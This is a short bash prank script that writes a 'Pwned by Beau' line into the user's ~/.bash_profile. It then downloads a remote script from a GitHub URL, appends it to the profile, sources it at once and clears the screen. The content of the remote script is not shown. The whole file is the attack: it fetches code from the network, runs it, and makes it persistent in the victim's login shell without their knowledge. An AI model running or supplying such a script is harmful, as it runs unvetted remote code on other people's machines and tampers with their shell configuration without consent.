#!/bin/bash
# This isn't funny
echo "# Pwned by Beau @ `date`" >> ~/.bash_profile
curl https://raw.githubusercontent.com/BeauBouchard/prank/master/newbashprofile.sh >> ~/.bash_profile
source ~/.bash_profile
clear
